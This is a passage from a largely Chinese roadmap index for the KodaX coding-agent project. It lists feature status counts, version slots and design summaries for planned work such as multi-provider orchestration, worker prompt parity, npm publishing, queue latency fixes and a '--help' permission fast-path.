trace 等待，trace 用于事后校准 benchmark 外部效度。**3 阶段时间盒**：Phase 1 ship primitive（1–2 天）→ Phase 2 跑 3 个 Council variant 侦察 benchmark（5–7 天，对比 single advisor / 跨家族双 advisor + 客观裁决 / 跨家族双 advisor + Evaluator 合并）→ Phase 3 三选一决策（ship Council / defer 到 v0.8.x / 调整 primitive，判据：外部锚 case 表现 ≥ primitive + 自家 benchmark 可解释优于 + 跨轮稳定性，三条全成立才 ship）。**显式不做**：Council 作为 MVP / specialty 扩展到 5+ 类 / hard escalation triggers / pivot 后 runtime 自动回退 stage boundary / blind_spots / confidence 字段 / verifiable_steps array / 强制跨家族（改为 `cross_family_preferred` default preference）/ zod 依赖 / advisor 调任何 tool / 递归 consult / advisor 输出免标记进 executor context / advisor 直接渲染给用户 / 让 verify-fail 触发第二次 consult（避免死循环）。**与 FEATURE_102 关系**：advisor span 是 Phase 0 telemetry 的一类零基础设施新增；review fan-out (Phase 1) 是事后审、consult 是事前会诊，MVP **不**复用 fan-out arbiter；advisor 复用 Phase 2 capability alias；advisor 不可达 fallback 与 Phase 3 provider fallback 是独立 channel；advisor trace 是 Phase 4 adaptive 训练数据源之一。 / 此前更新：FEATURE_102 added — Adaptive Multi-Provider Orchestration Runtime, planned for `v0.7.45`，详见 [v0.7.45 设计稿](features/v0.7.45.md#feature_102-adaptive-multi-provider-orchestration-runtime)。把 KodaX 从"provider 兼容层"升级为"可观测、可验证、可配置、逐步自适应的 orchestration runtime"，核心判断是**多模型收益来自分工 + 盲区互补，而非全程投票**；coding agent 比通用聊天更适合做多模型编排，因为存在客观裁决信号（测试 / typecheck / lint / build / patch apply / 运行结果）。**第一优先级是 telemetry / trace** —— 没有真实数据，任何路由策略都是占卜。Provider 切换严格发生在 stage boundary（结构化中间产物边界，而非时间边界），单 task 内不跨 provider 接力以保留 prompt cache 和 tool-call 协议一致性。**4 阶段实施路线（顺序硬性不可调换）**：Phase 0 Instrumentation/Trace（基础设施，先记原始事件不急定义 derived metric） → Phase 1 Review Fan-out + Objective Arbiter（最高确定性收益，可验证 finding 用测试/lint/typecheck 裁决，不可验证项才走 LLM judge） → Phase 2 Stage-level Capability Routing（约束版，仅对 long_context / vision / cheap_classify / main coding loop / review 5 类做静态路由，capability profile 必须能被 telemetry 修正） → Phase 3 Fallback / Health Checks（provider 限流/超时/质量异常自动降级） → Phase 4 Data-driven Adaptive（基于 Phase 0 数据引入 scoring / contextual bandit / Bayesian shrinkage 应对稀疏统计）。**显式不做**：task 内频繁跨 provider 接力 / LLM router 实时决定每一步 / 全程多模型投票 / 弱模型产出关键不可验证 plan 强模型盲目执行 / 没有 telemetry 就声称 adaptive。/ 此前更新：FEATURE_100 added — SA Runner Frame Adoption & Capability Unification, 占 v0.7.29 整版本，详见 [v0.7.29 设计稿](features/v0.7.29.md#feature_100-sa-runner-frame-adoption--capability-unification) 和 [ADR-020](ADR.md#adr-020-unified-agent-execution-substrate-feature_100-v0729)。把 SA / AMA 两套独立的 agent 执行路径收敛到统一 Runner 帧 + 单一 executor + 多 Agent declaration 模型（Option α），关闭 v0.7.23 FEATURE_080 "Option Y" facade 之后的双底座漂移。FEATURE_078 (Role-Aware Reasoning Profiles) 在 2026-04-26 一度顺延至 v0.7.30，2026-04-27 撤回顺延、加回 v0.7.29 与 FEATURE_100 同版（FEATURE_100 P3.6v 把 SA / AMA 共享底座做实之后，078 的 4 段决策链 L1→L4 可以原生跑在 substrate executor 上，已实施完成）。下游 089/090/092/094 保持原版本，它们对 Runner 级 guardrail / Agent declaration reasoning slot / `Runner.run(constructedAgent, ...)` 调用链的硬依赖由 FEATURE_100 一并提供。基于 `runner-driven.ts` 当前 13 处 `// legacy parity restore` 注释作为 FEATURE_084 漂移的反向实证；P1-P4 phased delivery + 5 重保险（capability inventory + golden trace + capability contract tests + dispatch eval baseline + reverse audit）+ 3 项加强（已知失踪能力 mining / contract test 锁能力存在 / reverse audit 0 命中）保证零回归直接切换。质量优先于节奏，预计 4-5 周。 / 此前更新：FEATURE_099 Provider Catalog Refresh + FEATURE_098 Per-Model Context Window & Output Token Limits — 两块 provider catalog 卫生工作均已实施完成、登记入 `v0.7.28` 已完成表（unreleased）；099 = DeepSeek V4 系列接入 + kimi-code label 收敛 + 删除 deprecated deepseek-chat/reasoner；098 = 接通 `KodaXModelDescriptor.contextWindow` / `maxOutputTokens` 死字段使 compaction trigger 与 wire-level max_tokens 按激活 model 真实窗口工作 + 当时按 Moonshot 文档把 `kimi.k2.5` 当作 128k 修了一遍 [**事后核对发现 K2.5 实际 256K，已于 commit `64785de` 改正，详见 v0.7.28 设计稿"实施后更正"小节**] + 修复 `zhipu.glm-5-turbo` (128k) 偏差 + 自定义 provider `models[]` 支持描述符对象格式。098 原计划 v0.7.29 与 FEATURE_078 同版发布，因实施提前完成迁入 v0.7.28。新增 `ark-coding` provider（Volcengine Ark Coding Plan，9 model，commit `8b5a380` + `4784dbd` per-model 窗口 pin）。FEATURE_097 AMA Runner Realtime Todo List — Claude Code 风格实时计划列表，planned for `v0.7.34`，作为 Plan B 主路线 `v0.7.33` 结束后第一个 AMA 可见性增强 feature，依赖 FEATURE_084 重写后的 Scout `executionObligations` 契约稳定形态。同时 FEATURE_095 SSH-Friendly Cell-Level Diff Renderer **Absorbed into FEATURE_057** v0.7.30 — cell-level screen buffer 是 057 §10 renderer-native selection / §11 ScrollBox parity / Track E output ownership 收口的实际前置基础设施，单独成版本会让 TUI 重构故事碎片化。SSH/ConPTY 闪烁的最急迫表现已通过 `engine.js` altScreen 分支 `log.clear() + log()` 合并成单次 `log.clearAndRender()` 的 10 行补丁消除，Track F 不再承担"SSH 闪烁唯一解药"的紧迫性——剩余动机（TextInput 光标漂移、渲染字节量、renderer-native selection/hit-test 基础设施）仍成立。)

> 中文阅读说明：
> 这份 `FEATURE_LIST` 是 roadmap 的总索引。
> 除了 feature 名称本身保留英文外，其余内容尽量用中文来说明“现在做到哪了、接下来做什么、该去哪里看设计”。
> `FEATURE_022` 是当前架构转向的总 feature，`019/025/029/034` 是它下面的关键支撑切片。

---

## 当前概况

| Item | Value |
|---|---|
| Tracked feature IDs | `001-151` (026, 118, 129, 133, 135-136, 138, 140 removed/never-claimed; 150 shipped via CHANGELOG/v0.7.37.md only — not in master table) |
| Total tracked features | `143` |
| Completed | `86` |
| Cancelled | `5` |
| Absorbed | `3` |
| InProgress | `1` |
| Planned | `55` |
| Current released version | `v0.7.37` |

> Note: `Planned` includes 8 strikethrough rows (`095` absorbed → 057, `059` absorbed → 084, `063` cancelled, `073` cancelled, `109` cancelled, `111` absorbed → 115, `122` cancelled, `127` cancelled never-planned) that remain in the planned table for traceability. The `Cancelled` and `Absorbed` counters above slice the same rows by lifecycle reason. `125` was re-scoped from v0.8.10 mode-based design to v0.7.41 LLM-First auto coordination — see its row for rationale.

### 各版本待做分布

> Auto-generated from row contents (see `tests/tracker-consistency.test.ts` enforced parity). Cancelled / absorbed / re-scoped rows still appear here under their **original** planned column for traceability — they show as `~~v0.7.x~~` strikethrough. Em-dash row corresponds to FEATURE_127 (Cancelled, never planned — no version slot).

| Version | Planned features |
|---|---|
| `v0.7.18` | `1` |
| `~~v0.7.25~~` | `1` |
| `v0.7.28` | `2` |
| `v0.7.29` | `4` |
| `v0.7.30` | `2` |
| `v0.7.31` | `3` |
| `v0.7.35.1` | `3` (142 Package Boundary Cleanup + Capability Sections Dedup Helper; 144 AMA Worker Capability Context Parity — 修复 v0.7.26 起 6 段 capability 漂移; 145 Agent Config Home Resolution Pipeline — 3-tier DI/env/default 修复 substrate consumer 耦合；v0.7.36 主线工作前置) |
| `v0.7.36` | `6` (114/115/119 + 131 + 130 + 143 Skill UX Upgrade + prompt-overlay 错位修正) |
| `v0.7.37` | `5` (116 + 141 + 146 v0.7.36 Behavioral Eval Follow-ups + 147 npm Publishing Pipeline + 148 Pattern B Multi-Turn Async Discipline) |
| `v0.7.38` | `3` (149 Queued Prompt Injection Latency & Mid-Turn UX Parity + 117 redesigned as Mutation Context Injection + 151 TodoList Visibility & LLM Self-Seeding Parity) |
| `v0.7.39` | `1` (120) |
| `~~v0.7.39 (legacy slot for FEATURE_096)~~` | `1` |
| `v0.7.40` | `2` (121 + 134) |
| `v0.7.41` | `1` (125 KodaX Team Mode — re-scoped from v0.8.10) |
| `~~v0.7.41~~` | `1` |
| `v0.7.42` | `1` (094) |
| `v0.7.43` | `1` (124) |
| `~~v0.7.43~~` | `1` |
| `v0.7.44` | `1` (123) |
| `v0.7.45` | `1` |
| `v0.7.46` | `1` |
| `v0.7.47` | `1` |
| `~~v0.7.48~~` | `1` (109 Cancelled — scope 全部已被 124/090/101/104 覆盖；ablation eval 成本过高) |
| `v0.7.49` | `1` (132 LSP 5 语言) |
| `v0.7.50` | `1` |
| `v0.8.0` | `4` (007/030/137/093 — 030+137 share Multi-Surface Delivery scope) |
| `~~v0.8.0~~` | `1` |
| `v0.8.2` | `1` |
| `v0.8.20+` | `1` (139 NotebookEdit, deferred) |
| `v0.8.x` | `1` |
| `—` | `1` (127 Cancelled — never planned, see row below for re-scope into FEATURE_120 + FEATURE_102) |

---

## 进行中的 Feature

| ID | Title | Planned | Design |
|---|---|---|---|
| `057` | Claude-Aligned TUI Substrate Refactor | `v0.7.30` | [v0.7.30](features/v0.7.30.md#feature_057-claude-aligned-tui-substrate-refactor) |

---

## 计划中的 Feature

| ID | Title | Category | Priority | Planned | Design |
|---|---|---|---|---|---|
| `087` | ConstructionRuntime and Constructed-World Substrate | Core | High | `v0.7.28` | [v0.7.28](features/v0.7.28.md#feature_087-constructionruntime-and-constructed-world-substrate) |
| `088` | Self-Construction Tier 2 — Tool Generation | Core | High | `v0.7.28` | [v0.7.28](features/v0.7.28.md#feature_088-self-construction-tier-2--tool-generation) |
| `100` | SA Runner Frame Adoption & Capability Unification | Internal / Refactor | Critical | `v0.7.29` | [v0.7.29](features/v0.7.29.md#feature_100-sa-runner-frame-adoption--capability-unification) |
| `078` | Role-Aware Reasoning Profiles | Internal | High | `v0.7.29` | [v0.7.29](features/v0.7.29.md#feature_078-role-aware-reasoning-profiles) |
| `103` | Scout Calibration & L5 User-Followup Escalate | Internal | Medium | `v0.7.29` | [v0.7.29](features/v0.7.29.md#feature_103-scout-calibration--l5-user-followup-escalate) |
| `104` | Prompt-Eval Harness Module | Internal / Test Infrastructure | Medium | `v0.7.29` | [v0.7.29](features/v0.7.29.md#feature_104-prompt-eval-harness-module) |
| `060` | Claude-Aligned Bounded-Memory Runtime and OOM Hardening | Internal | High | `v0.7.30` | [v0.7.30](features/v0.7.30.md#feature_060-claude-aligned-bounded-memory-runtime-and-oom-hardening) |
| `101` | Constructed Agent Admission Contract — Quality Invariants & 5-Step Manifest Vetting | Core / Safety Substrate | Critical | `v0.7.31` | [v0.7.31](features/v0.7.31.md#feature_101-constructed-agent-admission-contract) |
| `089` | Self-Construction Tier 3 — Agent Generation | Core | High | `v0.7.31` | [v0.7.31](features/v0.7.31.md#feature_089-self-construction-tier-3--agent-generation) |
| `106` | AMA Harness Selection Calibration — Scope-Aware ToolGuardrail + Scout Prompt Hard Rule | Core / Quality | High | `v0.7.31` | [v0.7.31](features/v0.7.31.md#feature_106-ama-harness-selection-calibration) |
| `142` | Package Boundary Cleanup — `@kodax/core` Removal & `@kodax/agent` Reaffirmation + Capability Sections Dedup Helper | Internal / Refactor | Critical | `v0.7.35.1` | [v0.7.35.1](features/v0.7.35.1.md#feature_142-package-boundary-cleanup--kodaxcore-removal--kodaxagent-reaffirmation) | **Patch release** 修复 v0.7.24 FEATURE_082 包结构漂移 + 新增 capability sections dedup helper（FEATURE_144 前置基础设施）。Batch A-D：`@kodax/core` 30 文件并入 `@kodax/agent`；session/persistence/compaction 回流 `@kodax/session-lineage`；Self-Construction 从 coding 迁到 agent；coding/agent-runtime/ 通用 middleware 上提。Batch E：新建 `@kodax/coding/src/prompts/capability-sections.ts` dedup helper 集中 13 段 prompt section 拼装，SA path 输出字节级相同，是 FEATURE_144 接通 AMA worker 的前置工具。**全部 batch 零业务逻辑改动 / 零 prompt 字面量改动**——TypeScript 编译器 + grep gate + 既有 ~5000 单元测试 + FEATURE_104 prompt eval 不重跑。**ADR-001 更新**反映 8 包结构 + **ADR-021 新增**写明 `@kodax/agent` vs `@kodax/coding` 边界规则 |
| `144` | AMA Worker Capability Context Parity — Fix v0.7.26 Bypass Latent Bug | Core / Quality | High | `v0.7.35.1` | [v0.7.35.1](features/v0.7.35.1.md#batch-f--ama-worker-capability-context-parity-fix必做batch-e-之后) | **同 v0.7.35.1 ship**（与 FEATURE_142 同 patch release，独立 feature 便于独立 ship gating）。修 v0.7.26 FEATURE_084 把 AMA worker 从 SA path 迁到 Runner-driven 时漏接 6 段 capability prompt section 的 latent bug：mcp-capability-context / skills-addendum / project-agents（AGENTS.md/CLAUDE.md）/ tool-construction / git-context / project-snapshot。过去 v0.7.26 + v0.7.27 FEATURE_086 注释自陈手工补过 5 段（environment / runtime-fact / working-dir / repo-intel / base-suffix），剩余 6 段一直 latent；用户实战已踩坑 3 项（MCP minimax server / `feature-list-tracker` skill / KodaX 自身 CLAUDE.md 项目规则被 AMA worker 完全忽略）。**修法**：AMA worker `role-prompt.ts` 调用 FEATURE_142 Batch E 的 `buildCapabilityContextSections()` helper，得到全部 6 段；新增 `gitContextSnapshot` / `projectSnapshotSnapshot` 两个 parent cache 字段（避免每 worker FS load）。**行为修复**——触发 FEATURE_104 prompt eval 重跑（`tests/ama-worker-capability-parity.eval.ts`，4 维度验收：worker 不退化 instruction following / 用户配 MCP 时 worker 主动调 `mcp_search` / 项目 CLAUDE.md 含硬规则时违反率 ≤ baseline / dirty repo Generator edit 前主动声明 git 状态），mean ≥80% 通过率作为 ship gate。**eval 失败 follow-up**：FEATURE_144 单独回退到 v0.7.35.2 retry，FEATURE_142 ship 不阻塞；如 root cause 是 worker token 溢出之类设计问题则 fold 进 v0.7.36 FEATURE_143 重新评估。**`prompt-overlay` 错位修正不在本 feature**——属"position 类"漂移而非"missing data 类"，迁移需更全 prompt eval，留 v0.7.36 FEATURE_143 |
| `145` | Agent Config Home Resolution Pipeline — 3-Tier Priority (DI / Env / Default) | Internal / Refactor | Medium | `v0.7.35.1` | [v0.7.35.1](features/v0.7.35.1.md#feature_145-agent-config-home-resolution-pipeline--3-tier-priority-di--env--default) | **同 v0.7.35.1 ship**（与 FEATURE_142 同 patch release，独立 feature 因 scope 独立——config home 与 capability injection 是不同主题）。修当前 `~/.kodax/` 在 6 个包共 ~30 处硬编码（仅 `@kodax/ai/reasoning-overrides.ts:49` 一处实现 `KODAX_HOME` env var 兜底，其余 29 处全无），导致 (a) 漂移风险（每加新 fs path 又一处硬编码）+ (b) **substrate consumer 耦合**（`@kodax/agent` 作为通用底座被未来 `@kodax/ops-agent` / `@kodax/data-analysis-agent` 等 consumer 调用时无法重定向 config dir）。**修法**：抽 `@kodax/agent/src/runtime/agent-home.ts` helper（~30 LoC + ~60 LoC test），3-tier 优先级：(1) `setAgentConfigHome(path)` 程序入参（最高，substrate consumer boot 时 set 一次）→ (2) `KODAX_HOME` env var（中，shell/CI/测试隔离）→ (3) `~/.kodax/` hardcoded default（最低，standalone kodax CLI 90% 场景）。**Singleton pattern**（与 `process.env.NODE_ENV` 同模式）避免 per-call DI 改 ~50 个函数签名 invasive。**显式不做** brand abstraction（YAGNI；DI 入参直接接受路径字符串足够覆盖任意 substrate consumer 重定向 use case）。**零行为变更**——DI 不传 + env 不设时 default 分支与现状字节级等价；FEATURE_104 prompt eval **无需重跑**。验收用 grep gate：`grep -rE "['\"]\\.kodax['\"]" packages/*/src/` 命中数从 ~30 降到 ≤ 5（helper + 必要的 path comparison）|
| `114` | AMA Harness V2 — Worker + Evaluator (Evaluator Preserved as Structural Gate) | Internal / Architecture | High | `v0.7.36` | [v0.7.36](features/v0.7.36.md#feature_114-ama-harness-v2--worker--evaluator-evaluator-preserved-as-structural-gate) |
| `115` | Message Queue Foundation — agentId-Scoped 2-Tier Priority Queue + Sleep-Gated Mid-Turn Drain | Internal / Infrastructure | High | `v0.7.36` | [v0.7.36](features/v0.7.36.md#feature_115-message-queue-foundation--agentid-scoped-2-tier-priority-queue--sleep-gated-mid-turn-drain) |
| `119` | Async Child Dispatch — Pattern B (Launch + Await) | Internal / Architecture | High | `v0.7.36` | [v0.7.36](features/v0.7.36.md#feature_119-async-child-dispatch--pattern-b-launch--await) |
| `143` | Skill UX Upgrade + prompt-overlay 错位修正 | Enhancement / UX + Internal / Refactor | High | `v0.7.36` | [v0.7.36](features/v0.7.36.md#feature_143-skill-ux-upgrade--prompt-overlay-错位修正) | v0.7.35.1 FEATURE_144 已修完 6 段 capability "missing data" 漂移；本 feature 收尾 1 段"position 类"漂移（`prompt-overlay` 从 user prompt 头迁回 system prompt，对齐 SA path）+ Skill 用户层 UX 三件（manifest 措辞硬化为 Claude Code 风格强约束 / classic CLI 启动时 skillsPrompt 构造与 Ink TUI 对齐 / `parseCommand` 加 mid-line `/skill:foo` 检测）。触发完整 prompt eval 验证 prompt-overlay 位置迁移不退化 worker H0/H1/H2 routing 行为 |
| `116` | Active Cache Control Foundation — cache_control Markers + 12 Provider Adapters | Internal / Cost Optimization | High | `v0.7.37` | [v0.7.37](features/v0.7.37.md#feature_116-active-cache-control-foundation) |
| `146` | v0.7.36 Behavioral Eval Follow-ups — FEATURE_143 / FEATURE_119 / FEATURE_131-B Multi-Alias LLM-Judge Sweep | Internal / Quality Gate | Medium | `v0.7.37` | [v0.7.37](features/v0.7.37.md#v0736-behavioral-eval-follow-ups正式-track非隐式-defer) | **正式 track，非隐式 defer**：v0.7.36 ship 时三个 LLM-facing 改动（FEATURE_119 Pattern B / FEATURE_131-B Unicode normalization / FEATURE_143 prompt-overlay 位置迁移）只跑了**结构 eval + dataset 回归**（无 API key、无 LLM judge），把 v0.7.36 design doc 原本要求的 multi-alias × multi-task 行为 eval 显式 track 到 v0.7.37 内必须完成的 quality gate。三份 sub-eval 总规模：A: 96 cells (FEATURE_143) + B: 20 cells (FEATURE_119) + C: 60 cells (FEATURE_131-B) = 176 cells，预算 ~$30。三份共享 FEATURE_104 benchmark/harness。任一不过门发独立修复 patch，不阻塞 v0.7.37 主线 FEATURE_116/141 ship |
| `147` | npm Publishing Pipeline — Multi-Package Release + Scope Rename + ai→llm Rename | Internal / Distribution | High | `v0.7.37` | [v0.7.37](features/v0.7.37.md#feature_147-npm-publishing-pipeline--多包发布管线--scope-重命名--aillm-改名) | v0.7.36 期间已发布占位包 `@kodax-ai/cli@0.0.1` 锁住 `@kodax-ai` 命名空间（unscoped `kodax` 被 npm 反 typosquat 拒，改 scoped 是官方建议）。本 feature 完成全套真实发布：(1) 9 个子包 `@kodax/xxx` → `@kodax-ai/xxx` 重命名；(2) 顺手把 `@kodax/ai` 改为 `@kodax-ai/llm`（避免 `@kodax-ai/ai` 重复语义）；(3) 792 处 import (packages/+src/+tests/+benchmark/) + 55 处 dependency + 6 处 tsconfig paths 批量替换 = 853 处总改动；(4) 每包加 `files` / `publishConfig` 字段；(5) workspace 通配 `*` 转具体版本；(6) 写 `scripts/release-npm.mjs` 一键发布脚本（10 包按依赖顺序）。**Migration impact**：CLI 用户零影响、npm 库用户首次发布无旧名字习惯、git-clone 高级用户需 sed 替换（CHANGELOG 给出 sed 模板）。预估 ~1 天完成。**显式不做**：自动化 changesets / npm provenance 签名 / bin 改名 |
| `148` | Pattern B Post-Dispatch Probe — Anti-Immediate-Await Rule + Layer 2 Single-Turn Behavioral Eval | LLM Prompt / Quality Gate | High | `v0.7.37` | [v0.7.37](features/v0.7.37.md#feature_148-pattern-b-post-dispatch-probe--anti-immediate-await-rule--layer-2-single-turn-行为-eval) | **v0.7.37 重发版本里 fold 进的 Layer 2 quality gate**（原计划 v0.7.37.1 patch，最终与 v0.7.37 同期 ship）。FEATURE_146-B 单轮 trigger eval（76-88% 并行触发率）**测不出** "派出去 → 立即 await" 退化模式。**初版本设计为 multi-turn mock executor harness 让 LLM 自由跑 6 轮，构成 [EVAL_GUIDELINES.md §反模式 2](../benchmark/EVAL_GUIDELINES.md) "let LLM run free, aggregate trace"——已修正为 Layer 2 single-turn probe**：构造"刚 dispatch 完，task_id 已回执"的 pre-canned 3-message history，单次 `provider.stream` 调用，机械断言下一个 tool_use 是不是 `await_child_task` on `child-1`。**载荷**：(1) `benchmark/datasets/pattern-b-post-dispatch-probe/cases.ts` — 5 个 "user 显式说 WHILE X runs, also do Y" canned history 场景；(2) `worker-role-prompt.ts` `dispatchRules` 加 anti-immediate-await 反例硬约束（"dispatch X, then DO Y, then await X" 具象语句）；(3) `tests/feature-148-post-dispatch-probe.eval.ts` 5 alias × 5 scenario × 3 reps = 75 probes。**实测 2026-05-08 一轮 sweep（291.6s, $1-4）**：degenerate-rate = **0.0% (0/75)** 跨 5 个 production alias（zhipu/glm51 / kimi / mmx/m27 / ds/v4pro / ds/v4flash 全 0/15）；non-degenerate 选择 100% 是用户显式要求的 side-task（3 scenario 选 read，2 scenario 选第二个 dispatch_child_task）。**Caveat**: 没跑 A/B baseline（pre-FEATURE_148 prompt）作 attribution，留作 optional follow-up。报告 → `docs/test-guides/FEATURE_148_v0.7.37_BEHAVIORAL_EVAL.md`。初版本草稿的 multi-turn mock-executor primitive + 多轮 eval 已删除（Layer 2 设计零 current use case） |
| `117` | ~~Read-Path Context Stripping~~ → **Mutation Context Injection** (v2, ships v0.7.38) | Enhancement / Quality | Medium | `v0.7.38` | [v0.7.38](features/v0.7.38.md#feature_117-v2-write-child-mutation-context-injection) | **Re-scoped 2026-05-09**：原前提（child 继承 5.2k token stable context）经实施期事实核查否定——`child-executor.ts` 的 `systemPromptOverride: CHILD_AGENT_SYSTEM_PROMPT` 走 `reasoning-plan-entry.ts:112-113` `??` 短路 `buildSystemPrompt`，child 已处于 ~500 token 干净状态，无 token 可省。**真实问题反向**：write child 也用同一 minimal override，看不到 AGENTS.md 的 mutation policy / forbidden items / coding style。**v2 实现 = 在 `executeWriteChild` 通过 `buildWriteSystemPrompt(parentCtx.gitRoot)` 把 AGENTS.md 拼到 `CHILD_AGENT_SYSTEM_PROMPT` 后**（read child 维持 minimal）；lookup 走 parent gitRoot 因为 worktree 是 transient checkout 不含 AGENTS.md；复用 FEATURE_149 Phase 1.2 mtime cache + FEATURE_116 cache_control: ephemeral 让 fan-out 仅一次计费。**配套清理（不属 117 范围）**：KodaX 只读 `AGENTS.md` 不读 `CLAUDE.md`，`agents-loader.ts:CONTEXT_FILE_CANDIDATES` 改为 `["AGENTS.md"]`；CLAUDE.md 是 Claude Code 专属语义文件，注入会语义错配。**实现 ~17 LoC，4 unit case 锁定行为，无新 prompt eval（仅复用项目已有 AGENTS.md 内容）** |
| `149` | Queued Prompt Injection Latency & Mid-Turn UX Parity — Remove `setTimeout(50)` + AGENTS.md mtime cache + interruptible-tool fast-abort + batched drain + up-arrow popAllEditable | Enhancement / UX + Internal / Performance | High | `v0.7.38` | [v0.7.38](features/v0.7.38.md#feature_149-queued-prompt-injection-latency--mid-turn-ux-parity) | **基于 2026-05-08 forensic 双向 source 对照立项**（KodaX vs `c:/Works/claudecode/src/`）。用户实战反馈"输入 queue 排队指令时并没有尽快注入"——确认 4 个延迟源叠加 floor 53ms / 上限 161ms 单轮排队：(L1) [`InkREPL.tsx:6267`](../packages/repl/src/ui/InkREPL.tsx#L6267) `stageQueuedPrompt` 末尾硬编码 `setTimeout(50)` 不可避免 50ms；(L2) [`agents-loader.ts:70`](../packages/coding/src/context/agents-loader.ts#L70) `loadAgentsFiles` 每轮 `existsSync`+`readFileSync` 全树遍历无 mtime cache，对照 Claude Code `services/claudemd.ts` + `utils/fileReadCache.ts`；(L3) [`StreamingContext.tsx:344`](../packages/repl/src/ui/contexts/StreamingContext.tsx#L344) `FLUSH_INTERVAL=80` 流式节流可能延迟 round-complete 检测；(L4) `notify()` 走 `forceUpdate()` 而非 `useSyncExternalStore`。**叠加 3 个架构 UX 缺口**：(G1) 长 bash 跑 30s 时新 prompt 必须等完，无 `interruptBehavior: 'cancel'` 工具标记 + fast-abort 路径；(G2) [`queued-prompt-sequence.ts:32-43`](../packages/repl/src/ui/utils/queued-prompt-sequence.ts#L32-L43) 一次 shift 一条跑一整轮 agent，N 条排队 = N 次 agent 调用（cost 浪费 + LLM 失去整体规划视角）；(G3) 队列只显示一行摘要 + Esc 砍最新，无 up-arrow popAllEditable 编辑/重排。**3 phase 实施**：Phase 1 Slice A 延迟清理（A1+A2+A3+A4 零行为变更，~1 天，无 prompt eval）；Phase 2 Slice C UX 表面（C1 up-arrow + C2 多条独立渲染，~0.5 天，纯 UI）；Phase 3 Slice B 行为变更（B1 interruptible-tool fast-abort + B2 abort 时合成 `tool_result` error block + B3 批量 drain 多 user message 进单轮，~2 天，触发 FEATURE_104 prompt eval 5 alias × 4 task = 20 cells × 5 = 100 cells 预算 ~$8）。**验收硬指标**：micro-bench `tests/queue-injection-latency.bench.ts` floor < 5ms；bash 30s sleep 时新 prompt 500ms 内起轮；5 条排队 = 1 次 agent 调用（cost tracker `agentInvocationCount` 验证）；跨 family eval mean ≥ baseline / max-min spread ≤ 15pp。**显式不做**：Council / multi-advisor consult（FEATURE_105 v0.7.46 范围）；input-as-async-generator 架构（state-setter 即可，与 Claude Code 同模型）；改 ESC / `MAX_PENDING_INPUTS` / FEATURE_115 priority 字段；soft-pause 状态机（FEATURE_111 v0.7.43 范围）；mid-tool-call 注入 |
| `151` | TodoList Visibility & LLM Self-Seeding Parity — Closing the FEATURE_097 Coverage Gap (MIN=1 + LLM op:'init' + Persistent Surface) | Enhancement / UX | High | `v0.7.38` | [v0.7.38](features/v0.7.38.md#feature_151-todolist-visibility--llm-self-seeding-parity--closing-the-feature_097-coverage-gap) | **基于 14 维度 KodaX vs `c:/Works/claudecode/src/` 双向对照立项**。FEATURE_097 (v0.7.34) + v0.7.35.1 hotfix + v0.7.38 FEATURE_149 Slice C4 之后代码全链路存在，但 5 道叠加 gate 让用户感知率接近 0%：(G1) `todo_update` 无 LLM 自主 init 路径，必须 Runner 从 Scout `executionObligations >= 2` 单源种入；(G2) Scout 多步骤判断硬 gate；(G3) UI `MIN_ITEMS_TO_RENDER = 2`；(G4) `todo-throttle-reminder` 的 `hasItems()` 死锁让空 store 永不提醒；(G5) `showSpinner === true` mount gate + 5s linger 销毁。**G1 是最深的根因**——前 4 道全部放宽 LLM 也没有工具能 init。**3 Slice 实施**：Slice A UI parity（`MIN_ITEMS=1` + drop linger + drop spinner gate，对齐 CC `tasks.length === 0` 才不渲染 + `expandedView==='tasks'` 持久语义）；Slice B LLM Self-Seeding（`todo_update` 加 `op: 'init'/'update'` 双模式，等价 CC `TodoWrite` 全列表写；`todo-throttle-reminder` 移除 `hasItems` gate；role-prompts Scout/Generator/Planner 三段提示 op:'init' 用法）；Slice C 持久可见（drop `setTodoItems([])` 5s 销毁 useEffect，items 跨 AMA 任务在 React state 自然续存）。**触发 FEATURE_104 prompt eval**（B3 改 `role-prompt.ts` + `todo_update` description）：`tests/feature-151-todo-self-seeding.eval.ts` 5 alias × 4 case 验证 LLM 在 Scout 不 seed 但任务多步骤时能自发调 init。**与 FEATURE_113 (v0.8.2) 关系**：onTodoUpdate event 流增加来自 LLM init 的来源，payload schema 不变；JSON consumer 不需要区分种入路径 |
| `154` | Universal `--help` Fast-Path — Generalise CC `isHelpCommand` Beyond 12 Language Tools | Enhancement / UX + Internal / Performance | Medium | `v0.7.38` | [v0.7.38](features/v0.7.38.md#feature_154-universal---help-fast-path) | **基于 [Issue 129](KNOWN_ISSUES.md#129) 后续 KodaX vs `c:/Works/claudecode/src/` 对照立项**。CC [`commands.ts:388-436 isHelpCommand`](C:\Works\claudecode\src\utils\bash\commands.ts#L388-L436) 让任何 `cmd --help` 命令绕过 Haiku prefix extractor 和 YOLO classifier，省 LLM 调用 + 提速。KodaX 当前 [`permission.ts:68-76`](../packages/repl/src/permission/permission.ts#L68-L76) 只对 12 个 hard-coded 语言工具（`node` / `npm` / `python` / etc.）放行 `--help`；用户跑 `docker --help` / `kubectl --help` / `terraform --help` 全部走 LLM classifier，每次浪费一次 token cost + 延迟。**实现 ~50 LoC**：纯函数 `isHelpCommand(command): boolean`（trim → endsWith `--help` → 拒绝引号 → split + 校验：每个 token 要么是 `--help` 要么是简单字母数字），加在 [`isBashReadCommand`](../packages/repl/src/permission/permission.ts) 顶部 fast-path。**严格于 CC 一处**：CC `shell-quote` 把 `$VAR` 当 object token 跳过，KodaX 简单 split 把 `$VAR` 当 string 拒绝；这是有意的安全保守。**与 FEATURE_152 关系**：本 feature 不依赖 `shell-quote`（FEATURE_152 引入），用简单 string split 即可；FEATURE_152 落地后 `isHelpCommand` 内部仍然用简单 split（更直接），不切换到 AST 路径。**与 FEATURE_092 关系**：减少 auto-mode classifier 调用频次，用户体验对齐 CC auto 模式"无打断"承诺 |
| `120` | Async Child Steering — SendMessage + TaskStop + Dispatch model_hint Field | Internal / Architecture | High | `v0.7.39` | [v0.7.39](features/v0.7.39.md#feature_120-async-child-steering) |
| `121` | Child Agent Scratchpad — Decoupled Large Output Channel | Enhancement / UX | Medium | `v0.7.40` | [v0.7.40](features/v0.7.40.md#feature_121-child-agent-scratchpad) |
